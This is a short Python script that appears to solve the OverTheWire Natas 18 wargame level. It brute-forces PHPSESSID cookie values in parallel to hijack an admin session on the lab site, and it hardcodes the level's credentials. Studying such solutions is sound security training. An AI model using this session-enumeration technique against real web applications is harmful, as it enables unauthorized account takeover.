import requests
from multiprocessing.pool import Pool, ThreadPool

USERNAME = 'natas18'
PASSWORD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
AUTH = USERNAME, PASSWORD
URL = 'http://natas18.natas.labs.overthewire.org/'

def try_id(id_num):
  cookies = {"PHPSESSID": str(id_num)}
  params = {'username': "admin", "password": "whatever"}
  response = requests.get(URL, params=params, auth=AUTH, cookies=cookies)
  if "You are an admin" in response.text:
    return response
  return None

def main():
  

  with Pool(16) as pool:
    for response in pool.imap_unordered(try_id, range(1, 641)):
      if response is not None:
        break
  print(response.text)



if __name__ == "__main__":
  main()